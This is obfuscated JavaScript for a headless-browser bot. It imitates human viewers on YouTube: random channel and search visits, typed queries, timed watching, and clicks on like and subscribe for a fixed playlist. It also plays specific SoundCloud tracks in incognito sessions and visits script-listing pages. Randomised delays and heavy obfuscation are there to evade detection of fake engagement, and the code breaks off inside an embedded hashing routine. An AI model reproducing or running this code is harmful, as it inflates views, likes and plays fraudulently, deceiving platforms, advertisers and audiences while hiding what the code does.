const a1 = b,
  a0 = d,
  Z = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x79 * -0x51 + 0x1 * -0xa1f + 0x1 * 0x3069))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x1c7f + -0x38 + 0x1cb7), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0xab44 + 0x51 * -0x22a + 0x7936 + (-0x40d2 + 0x712f + 0x1 * 0xa3b) * random()) : await standardWaitForNetIdle(f), await wait(0x1cbe + 0x9d0 * 0x2 + -0x1cd6 + (-0x1 * 0x187d + -0x46ca + 0x8657) * random()), 0x0 + 0x14 * -0xa7 + -0x101 * -0xd;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0xf8b + -0x239b + -0x46ae * -0x1), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x2322 + -0x1 * 0x1299 + -0x1088;
}
async function randomWait() {
  return await wait(-0x1038 + -0x269e + 0x4a5e + (-0x1baa + -0xe * 0x13a + 0x7 * 0x932) * random()), 0x29 * -0x9f + 0x1 * 0x933 + 0x1045;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    const R = b;
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x334 + 0x2 * 0x529 + -0x71e, 0xb19 + 0x1f * 0x24 + -0x4f * 0x32), i[Math['floor'](Math[R(0x9, '1R!I')]() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x13e79 + 0x99ee * -0x3 + 0x179b1) * getRandomInt(0x76d + 0x36 + -0x7a1, 0x5a6 + -0x1eb5 + 0x1914), h)), 0xd * 0x26 + 0xbc3 * -0x1 + 0x9d6;
}

function a() {
  const bp = [
    'B3HszwfS',
    'h\x20score,mo',
    'Bc9vqZqTnZLvtW',
    'WPSZW5JdQ0RcI8ogW7ZdV8on',
    'youtube-hi',
    'mMvxEuO4rKj2uq',
    'lJm2',
    '-moomoo-io',
    'Dg9Y',
    'sCk+WOWWr3i',
    'WOdcN8kitCooW73dI8oRWP3cPa',
    'lsvfnYvcrcu5mq',
    'WPJdHSkIW5xcVspdPqlcPCkM',
    'W6rodCooWOBcSGCu',
    'ACouFv57nXddJCoHW5q',
    'userAction',
    'gOUPndcj7z',
    'W4FdMmkQA8o9WPddS8kOWP3cRG',
    'z2v0qxr0CMLIDq',
    'BgL0AgvYlwLVlq',
    'sYnNkSkUW4KeWP52W5W',
    '537.36',
    'WQlcJmkxW5NdVmo9',
    'ChrZlZm3ndC5na',
    'rg/en/scri',
    'newPage',
    'lMnVBt9WywDLpq',
    'lxn1CNzPDI1PBW'
  ];
  a = function() {
    return bp;
  };
  return a();
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0xf8 * -0x11 + 0x1 * 0x1eb5 + -0x2f2d;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0xad * 0xd + 0x269b * -0x1 + 0x2f65]['split']('\x20');
    for (let k = -0x1184 + -0x1f97 * -0x1 + -0xe13; k < i['length']; k += 0x1845 + 0xc04 * 0x1 + -0x2447)
      j += i[k] * h[i[k + (0xfe3 + 0xa13 + -0x531 * 0x5)]];
    return j;
  });
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x13b6 + -0x1a2c + -0x1 * -0x2de2);
    let h = e[f];
    if (c['mlTOAj'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x2d * 0xc3 + -0x4 * 0x4bd + -0xf53, r, s, t = -0x2c4 + 0x1b7 * -0xf + 0x1c7d; s = m['charAt'](t++); ~s && (r = q % (0xa1f * -0x1 + 0x7b3 * 0x3 + -0x1da * 0x7) ? r * (-0x38 + -0x73 + -0x2f * -0x5) + s : s, q++ % (-0x1 * 0xb16 + 0x15f1 + -0x4b * 0x25)) ? o += String['fromCharCode'](0xa0 * -0xa + -0x1 * -0x12be + 0x3d5 * -0x3 & r >> (-(-0x1d32 + -0x2 * 0x61f + 0x2972) * q & -0x5a5 + 0x0 + 0x1 * 0x5ab)) : 0xded + -0x1b0e + 0xd21) {
          s = n['indexOf'](s);
        }
        for (let u = -0x10af + -0x25 * -0x4a + 0x5fd, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x18b4 + -0x140 + -0x1764))['slice'](-(-0xa8a + -0x830 + 0x12bc));
        }
        return decodeURIComponent(p);
      };
      c['nVZFRB'] = i, b = arguments, c['mlTOAj'] = !![];
    }
    const j = e[-0x1f94 + 0x2 * 0x5a6 + 0x1448],
      k = f + j,
      l = b[k];
    return !l ? (h = c['nVZFRB'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function anchorAndView(f) {
  const S = b;
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log(S(0x14, 'cH76') + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const T = b,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x2204 + 0x5 * -0x215 + 0x3 * 0xed1)['map'](l => Array['from'](l['children']))['flat'](0x21b9 + -0xcf9 * 0x1 + 0x1 * -0x14bf)['map'](l => l['childNodes'][0x50b * 0x1 + 0x13c7 * -0x1 + 0xebd * 0x1]['childNodes'][-0x1714 + 0x2 * -0x89b + 0x284a]['childNodes'][0xb61 + -0x2b * 0xd8 + -0x4 * -0x63a]['childNodes'][0x2009 + -0x95 * -0x3b + -0x426 * 0x10]['childNodes'][0xd76 + 0x2 * -0x687 + -0x67]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + T(0xd, 'Mf7H')), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x39e * -0x8 + -0x1 * -0xfa7 + -0x823 * 0x5, 0x6f5 + 0x1eb9 + 0x17 * -0xca)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x3075 + 0x227a + 0x4893);
  const h = await getMaxTime(f),
    i = Math['min']((-0x4ca7 + -0xf888 + 0xd * 0x2b0b) * getRandomInt(0xc77 * -0x2 + -0x6 * 0x244 + 0x2688, -0x248e + -0x17 * 0x1a5 + 0x6b * 0xb2), h);
  return await wait(i), -0x142b * 0x1 + 0x1 * 0x17e3 + -0x3b7;
}
async function frontScreenActions(f) {
  const U = b;
  return log(U(0x11, 'RF%u') + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x1 * -0x15cb + 0x1 * 0x1620 + -0x2beb]['children'][-0x1780 + -0x2106 + -0x5 * -0xb4e]['children'][-0x2f * 0x4c + 0xfa7 + 0x1d * -0xf]['children'][0x17fc + -0x7 * -0x371 + -0x3013 * 0x1]['children'][0x1 * -0x201e + 0x2229 + -0x20b * 0x1]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x2641 + -0x4 * 0x573 + -0x1074;
}
async function searchAndView(f) {
  const V = c;
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + V(0x0), searchTerms['random'](), {
    'delay': -0x1 * -0x1c99 + -0x1d1e + 0xe9 + (0x2615 + 0x1c63 + -0x2 * 0x2123) * random()
  }), await wait(-0xf76 * 0x1 + 0x1761 + 0x1fd * -0x3 + (0x2f * -0x14 + -0x26b8 * 0x1 + 0x10 * 0x2b9) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x6de + -0x2682 + 0xfd3 * 0x2]['childNodes'][-0x35 * -0x5d + -0x23 * -0x30 + -0x3b0 * 0x7]['childNodes'][0x1 * 0x938 + -0x13a * -0xd + -0x863 * 0x3]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0xb * -0x77 + 0x2482 + -0x299a]['childNodes'][0x169a + 0x5 * 0x6eb + 0x79 * -0x79]['childNodes'][-0x1b38 + 0x269e + -0xb64]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x16c3 * -0x1 + -0x25e6 + -0x22 * -0x72),
          r = 0x30b + 0x1 * -0x15d4 + 0x12c9;
        for (let u = 0x52 * -0xa + 0x5 * -0x3a2 + -0x155e * -0x1; u < q['length']; u += -0x75e * -0x1 + 0x259 + 0x163 * -0x7)
          r += q[u] * k[q[u + (-0x1a * 0x81 + 0x5ca + 0x751)]];
        return r;
      }(n);
  });
  await wait((-0x2dfd * -0x2 + -0x17ce + 0x1 * -0x994) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x18ef2 + 0x1 * -0x116f5 + 0x39047) * getRandomInt(0x11b0 + -0x7 * 0x581 + 0x14d8, -0x1b69 + 0x754 + 0x6b5 * 0x3), h + (-0x1 * -0x5f2 + 0x2 * 0x11c3 + -0x36 * 0x68));
  return await wait(i), 0x1dbe + -0x1a * -0x75 + 0x853 * -0x5;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x9 * -0x47 + 0x1f85 * 0x1 + -0x2204 * 0x1), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0xd9 * -0x3 + 0xb * 0x213 + -0x4 * 0x369 + (-0x12b8 + -0x206c + 0x370c) * Math['random']());
    });
  }, 0x2802 + -0x212e + -0x4 * -0x521);
  await wait(-0xc9b4 * -0x4 + -0x2 * 0x26c47 + 0x6459e);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x6d46 + 0x336 * 0x5d + 0x1 * 0x2d08) * getRandomInt(0x6dd + 0x3 * -0x17a + -0x26b * 0x1, -0x405 + 0xc8c + 0x1a * -0x53)), clearInterval(h), -0x3 * 0x4a + 0x23 * 0x38 + -0x6c9;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x524 + -0x1788 * -0x1 + -0x1cac;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0xc41 * -0x3 + 0x309 + 0xb * 0x311;
    await randomWait();
  }
  return 0x10b * -0x19 + 0x8c5 + 0x114f;
}

function fetchRandomSC() {
  return Math['random']() <= -0x1c27 + -0x2 * -0x479 + -0x21 * -0x95 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x9ab + -0x1707 + 0x20b2 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x198 + 0x1 * 0x20c5 + -0x1f2d + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x575 + 0x796 + -0x221;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          const W = c;
          let n = document['querySelec' + W(0x8)]('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0xc4fe + -0x240b + -0xed5 * -0x1 + getRandomInt(0x5ea + -0x1eb * -0x25 + 0x97 * -0x1f, -0x3 * -0x2da9 + -0x1 * 0xb32f + -0x2 * -0x4fb2));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x3 * -0x7d + 0x13 * 0x25 + -0x147), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x225a + -0x7 * -0x503 + -0x456f;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x145 * 0x10 + 0x2080 + -0x14 * 0x2a4, 0x241a + 0x4 * 0xab + -0x2694)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x34d + -0x959 + 0x1476 + floor((0x1db + 0x1 * -0xeae + 0x10bb) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x4016dbf8 + 0x9e7845ee + 0x439a2 * 0x7f5),
          -0x258791 * 0x2 + 0xc684ab + 0x48a77,
          -0x1 * 0xda78 + 0x92fa + 0x63bf * 0x2,
          0x2f0 + 0x1 * 0x10d2 + -0x91 * 0x22
        ], y = [
          0x262f + -0xf71 + -0x16a6,
          0x1 * 0x9fc + -0x1 * -0x163c + -0x2028,
          0x12f * -0x2 + 0x2246 + -0xaa * 0x30,
          -0x177e + -0x1 * -0x2d7 + -0x11 * -0x137
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x8f4 + 0x1e74 + -0x157f * 0x1)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x1 * -0x194c + -0x7b2 + 0x2 * 0x107f; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x1d81 + -0x1 * -0x1b1 + 0x2c8 * 0xa) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x45a * 0x2 + 0x1 * 0x10 + -0x8c4] = A[0x2049 + -0x15de + -0x1 * 0xa5b] = A[0xa72 + -0x255 + -0x15a * 0x6] = A[-0xf9 * 0x15 + 0x1 * 0x2f5 + 0x117a] = A[0x7ef + 0x3f9 + 0x91 * -0x15] = A[0x1d0c + -0x11df + -0xb29 * 0x1] = A[-0x1 * 0x120f + 0x2 * -0x10f3 + -0x1 * -0x33fa] = A[0x5 * 0x50e + 0x1 * -0x1661 + -0x2df] = A[0x888 + 0x1f83 + 0x314 * -0xd] = A[0x3 * -0xac9 + 0x17 * -0x16d + -0x9 * -0x73e] = A[0x21bd + -0x1d * 0xf6 + -0x5d6] = A[-0x4 * 0x647 + 0x13a1 + -0x9d * -0x9] = A[0x1ad0 + 0x1af1 + -0x35b6] = A[0x195 * -0x18 + 0x235 + 0x67 * 0x59] = A[0xbfc + 0xe75 + -0x1a64] = A[0x2610 + -0xacf * 0x2 + 0x419 * -0x4] = A[-0x23ca + -0x1c06 + -0xc5 * -0x53] = -0x2 * 0x100d + -0x670 + 0x2 * 0x1345, this['blocks'] = A) : this['blocks'] = [
                0xf86 * -0x1 + 0x1251 + 0x41 * -0xb,
                0x1d4b * 0x1 + 0x14c5 + -0x3210,
                0x1b * 0x93 + -0x1 * -0x23ab + 0x14 * -0x28f,
                -0x1 * 0x5bb + -0x365 + 0x1 * 0x920,
                0xab4 + 0x2363 * 0x1 + -0x2e17,
                0x7f7 + -0x23fd + 0x1c06,
                -0x56 * -0xf + 0xbd3 * -0x1 + -0x9 * -0xc1,
                -0x1 * 0x1fa + -0x16 * 0xaf + 0x1104,
                0x1cf * 0x9 + -0x462 + -0xbe5,
                -0x9 * -0x1b7 + -0x1f6f + 0x100 * 0x10,
                -0x2602 + 0x18b5 + 0xe3 * 0xf,
                -0x47c + 0x1107 * -0x1 + 0x1 * 0x1583,
                0x7 * 0x509 + -0x268e + 0x1 * 0x34f,
                -0x144f + -0x1 * 0x128b + 0x26da,
                0x10a3 + 0xed1 + -0x1f74,
                -0x2310 + -0x313 * 0xb + 0x44e1,
                -0xa * 0x14b + 0x10a5 + -0x1 * 0x3b7
              ], this['h0'] = 0x1 * 0x5cb62432 + -0xc1e8fa5e + 0xfba75a1 * 0xd, this['h1'] = -0xd86c7561 + 0x4476 * -0x5cbf + -0x6 * -0x502bef7e, this['h2'] = -0xbb * -0x14758bd + -0x94cef9a1 + 0x3e6c0490, this['h3'] = -0xb59ff49 * -0x1 + 0x8db867 + -0x6 * -0xb71a21, this['h4'] = -0x179afdc7 * 0xd + -0x7670c771 + -0x11f9 * -0x228f5c, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x2f9 + -0x25aa + 0x1 * 0x28a3, this['finalized'] = this['hashed'] = -0x162 * -0xf + 0x18ab + -0x19 * 0x1d1, this['first'] = 0x1f * 0xa7 + 0x1 * -0x23d3 + 0xf9b;
            }
            ['update'](J) {
              const X = b;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x2 * -0x1226 + -0x1d4e + 0x419a, O = J['length'] || -0x28c + -0x284 * -0x8 + 0x14 * -0xe1, P = this[X(0x16, 'O)oK')]; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x2546 + 0xe * 0x53 + 0x1a3 * 0x14, P[-0xd13 * 0x2 + 0x1179 + 0x8ad] = this['block'], P[0x5f2 + 0x1 * -0xb9 + 0x1 * -0x529] = P[0x2 * 0xd01 + -0x360 + 0x1 * -0x16a1] = P[0xe * 0x1f2 + 0x7 * -0x56f + 0xacf] = P[0x17f3 + 0x17b3 + -0x2d * 0x10f] = P[0x1 * 0x679 + -0x1362 * -0x2 + -0x2d39] = P[0x154a + 0xe5f + -0x8e9 * 0x4] = P[-0xc6e * 0x1 + -0x185 * -0x5 + 0x4db] = P[-0x1c1a + -0x67 * -0x7 + -0x195 * -0x10] = P[-0x1 * -0x163d + 0x24da + -0x48b * 0xd] = P[-0x4 * -0x832 + 0x1548 + 0x1 * -0x3607] = P[-0x1 * 0x60d + 0x2 * 0xeb3 + 0xdd * -0x1b] = P[0x296 * 0x8 + 0x1 * -0x1ba7 + 0x2e * 0x27] = P[-0x2 * 0x23d + -0x2b6 + 0x73c] = P[-0x18a7 + -0x2367 * -0x1 + -0xf9 * 0xb] = P[-0xda7 + -0x51f * 0x3 + 0x1d12] = P[0x366 * -0x1 + -0x730 + 0xaa5] = 0x25 * 0x7f + -0x1393 * -0x1 + 0x3cb * -0xa), K) {
                    for (N = this['start']; M < O && N < -0x17 * 0xb5 + -0x1 * 0x7a9 + 0x182c; ++M)
                      P[N >> -0x2243 + -0x258 + -0x67 * -0x5b] |= J[M] << y[0x1af3 + 0xec3 + -0x29b3 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0xace + -0xc00 + 0x170e; ++M)
                      (L = J['charCodeAt'](M)) < -0x21bd + -0x1a63 * -0x1 + -0x5 * -0x192 ? P[N >> -0x114b * -0x2 + 0xd05 * 0x1 + -0x2f99] |= L << y[0x1 * -0xc73 + 0x1 * 0x2089 + -0x3 * 0x6b1 & N++] : L < -0x2 * -0x668 + -0x18d2 + 0x1402 * 0x1 ? (P[N >> -0x2559 * 0x1 + 0x18f + 0x23cc] |= (-0x173f + -0x1c9 * -0x10 + -0x491 | L >> 0xd18 + 0x20ba + -0x2dcc) << y[0x113 * -0x1 + -0x1b47 + 0x1c5d & N++], P[N >> 0x7f * -0x6 + 0x1f76 + -0x1b * 0x10e] |= (-0x3 * -0x744 + 0x5 * -0x99 + -0x124f * 0x1 | -0x2706 + -0xb4a * -0x1 + -0x1 * -0x1bfb & L) << y[-0x1f01 + 0x2609 + 0x705 * -0x1 & N++]) : L < 0x1b83 * 0xb + 0x5ff6 + -0xb697 || L >= 0x8 * 0x3445 + -0xad6b * -0x1 + -0x16f93 ? (P[N >> -0x1 * -0x4e9 + 0x426 + -0x14b * 0x7] |= (-0x81 * 0x39 + 0x365 + 0x1a34 | L >> -0x1 * 0x1647 + -0xa3c + 0x208f) << y[0x1 * 0x14f5 + -0x205 * -0x5 + -0xa59 * 0x3 & N++], P[N >> 0x19 * 0x132 + -0x15ef + -0x1 * 0x7f1] |= (-0x1e4a + 0x3 * -0x19 + -0x6d * -0x49 | L >> -0x1be + 0x1 * 0x16f7 + -0x9 * 0x25b & -0x2a2 + 0x69e + 0xb * -0x57) << y[-0xab9 + 0x1047 * 0x1 + -0x58b & N++], P[N >> -0x881 * -0x1 + 0x1 * -0x17ab + -0x796 * -0x2] |= (-0xae0 + -0x1 * 0x361 + 0xec1 | 0x1 * -0x1f0f + 0xb2 * 0x11 + 0x137c & L) << y[0x6b + -0xe3a + 0x3d * 0x3a & N++]) : (L = 0x19c57 + 0x1c075 + -0x1 * 0x25ccc + ((0x23cc * 0x1 + -0x2559 * -0x1 + -0x4526 & L) << -0x232e + 0x1462 + 0xed6 | 0x1 * -0xca0 + -0x96e + -0x2e5 * -0x9 & J['charCodeAt'](++M)), P[N >> 0x1821 + 0xc1c * -0x2 + 0x19] |= (0x11 * 0x1e3 + 0xfdf * -0x1 + 0x3d1 * -0x4 | L >> -0x532 + -0x8a1 * 0x2 + 0x1686) << y[0x97d + 0x1270 + 0x1 * -0x1bea & N++], P[N >> -0x1 * 0x168d + 0xb5 * 0x3 + -0xc * -0x1b4] |= (0x2272 * 0x1 + 0x1372 + -0x3564 | L >> 0x1 * -0x1183 + 0x1 * -0x153d + 0x26cc & 0xce6 + 0x33 * -0x3b + 0x73 * -0x2) << y[-0x1 * 0x1e28 + -0x295 * -0xe + -0x5fb & N++], P[N >> -0x1985 + -0x13c7 + -0x78d * -0x6] |= (0x1f49 + -0x173c + -0x78d | L >> 0xbbd + 0xcbe + 0x1875 * -0x1 & 0x1dc2 + -0xdef + -0xf94) << y[-0x1dd6 + 0x1ad1 * -0x1 + -0x1 * -0x38aa & N++], P[N >> 0x1bba + 0x6 * 0x466 + -0x361c] |= (-0x1c97 + 0x412 + -0x3 * -0x857 | 0x725 + 0x1520 + -0x1c06 & L) << y[-0xa36 * -0x1 + 0xb * -0x281 + 0x1158 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x2489 + 0x446 * 0x1 + -0xd85 * 0x3 ? (this['block'] = P[0x112c + -0x1998 + 0x87c], this['start'] = N - (-0x503 + 0x2276 * 0x1 + 0x23f * -0xd), this['hash'](), this['hashed'] = -0x12a5 * 0x1 + -0x1fba + -0x10 * -0x326) : this['start'] = N;
                }
                return this['bytes'] > -0x2 * -0x107ca5f8 + -0x6ebef398 + 0x14dc5a7a7 && (this['hBytes'] += this['bytes'] / (-0x2db534 * 0x71e + -0x781ecdc + 0x9334653d * 0x4) << 0x471 * -0x7 + -0x16fa + -0x3611 * -0x1, this['bytes'] = this['bytes'] % (-0xd841ad48 * -0x2 + 0x22abe3ac * 0x6 + -0x1808ab098)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x5d * -0x2e + 0x201 * -0x1 + 0x1 * -0xeb4;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
